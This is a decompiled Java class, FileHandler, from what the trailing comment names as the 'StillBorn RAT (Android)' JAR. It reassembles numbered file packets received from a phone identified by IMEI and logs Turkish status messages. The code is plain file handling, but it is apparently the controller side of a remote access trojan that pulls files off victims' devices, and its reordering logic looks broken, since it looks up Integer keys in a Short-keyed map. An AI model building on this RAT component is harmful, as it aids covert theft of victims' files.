/*   1:    */ package handler;
/*   2:    */ 
/*   3:    */ import Packet.FilePacket;
/*   4:    */ import Packet.Packet;
/*   5:    */ import gui.GUI;
/*   6:    */ import java.io.File;
/*   7:    */ import java.io.FileNotFoundException;
/*   8:    */ import java.io.FileOutputStream;
/*   9:    */ import java.io.IOException;
/*  10:    */ import java.util.HashMap;
/*  11:    */ import server.Server;
/*  12:    */ 
/*  13:    */ public class FileHandler
/*  14:    */   implements PacketHandler
/*  15:    */ {
/*  16:    */   private GUI gui;
/*  17:    */   private int channel;
/*  18:    */   private String imei;
/*  19:    */   private String dir;
/*  20:    */   private String dwnName;
/*  21: 42 */   private short nextNumSeq = 0;
/*  22:    */   private HashMap<Short, byte[]> tempData;
/*  23: 44 */   private long dataLength = 0L;
/*  24: 45 */   private short max = 10;
/*  25:    */   private FileOutputStream fout;
/*  26:    */   
/*  27:    */   public FileHandler(int chan, String imei, GUI gui, String dir, String dwnName)
/*  28:    */   {
/*  29: 49 */     this.channel = chan;
/*  30: 50 */     this.imei = imei;
/*  31: 51 */     this.gui = gui;
/*  32: 52 */     this.dir = dir;
/*  33: 53 */     this.dwnName = dwnName;
/*  34: 54 */     this.tempData = null;
/*  35: 55 */     File f = new File(dir);
/*  36: 56 */     if (!f.exists()) {
/*  37: 57 */       f.mkdirs();
/*  38:    */     }
/*  39: 58 */     f = new File(dir, dwnName);
/*  40:    */     try
/*  41:    */     {
/*  42: 60 */       this.fout = new FileOutputStream(f);
/*  43:    */     }
/*  44:    */     catch (FileNotFoundException e)
/*  45:    */     {
/*  46: 62 */       gui.logErrTxt("Dosya bulunamadı.");
/*  47:    */     }
/*  48: 64 */     this.tempData = new HashMap();
/*  49:    */   }
/*  50:    */   
/*  51:    */   public void receive(Packet p, String imei) {}
/*  52:    */   
/*  53:    */   public void handlePacket(Packet p, String temp_imei, Server c)
/*  54:    */   {
/*  55:112 */     ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).getStorage(this.channel).reset();
/*  56:113 */     FilePacket packet = (FilePacket)p;
/*  57:    */     try
/*  58:    */     {
/*  59:117 */       int length = packet.getData().length;
/*  60:118 */       short numSeq = packet.getNumSeq();
/*  61:120 */       if (numSeq == this.nextNumSeq)
/*  62:    */       {
/*  63:121 */         this.fout.write(packet.getData());
/*  64:122 */         this.dataLength += length;
/*  65:123 */         fillFile(numSeq);
/*  66:124 */         if (packet.getMf() == 1)
/*  67:    */         {
/*  68:125 */           this.nextNumSeq = ((short)(this.nextNumSeq + 1));
/*  69:    */         }
/*  70:    */         else
/*  71:    */         {
/*  72:128 */           this.gui.logTxt("Dosya transferi tamamlandı !");
/*  73:129 */           this.fout.close();
/*  74:130 */           ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).removeListener(this.channel);
/*  75:    */         }
/*  76:    */       }
/*  77:134 */       else if (this.tempData.size() <= this.max)
/*  78:    */       {
/*  79:135 */         this.tempData.put(Short.valueOf(numSeq), packet.getData());
/*  80:    */       }
/*  81:    */       else
/*  82:    */       {
/*  83:137 */         this.gui.logErrTxt("Bozuk dosya. Dur");
/*  84:138 */         this.fout.close();
/*  85:139 */         ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).removeListener(this.channel);
/*  86:    */       }
/*  87:    */     }
/*  88:    */     catch (IOException e)
/*  89:    */     {
/*  90:144 */       this.gui.logErrTxt("Yazarken hata oluştu (IO Exception)");
/*  91:145 */       ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).removeListener(this.channel);
/*  92:    */     }
/*  93:    */   }
/*  94:    */   
/*  95:    */   private void fillFile(short numSeq)
/*  96:    */     throws IOException
/*  97:    */   {
/*  98:150 */     short num = numSeq;
/*  99:151 */     while (this.tempData.containsKey(Integer.valueOf(num + 1)))
/* 100:    */     {
/* 101:152 */       this.fout.write((byte[])this.tempData.get(Integer.valueOf(num + 1)));
/* 102:153 */       this.tempData.remove(Integer.valueOf(num + 1));
/* 103:154 */       num = (short)(num + 1);
/* 104:    */     }
/* 105:156 */     this.nextNumSeq = num;
/* 106:    */   }
/* 107:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     handler.FileHandler
 * JD-Core Version:    0.7.0.1
 */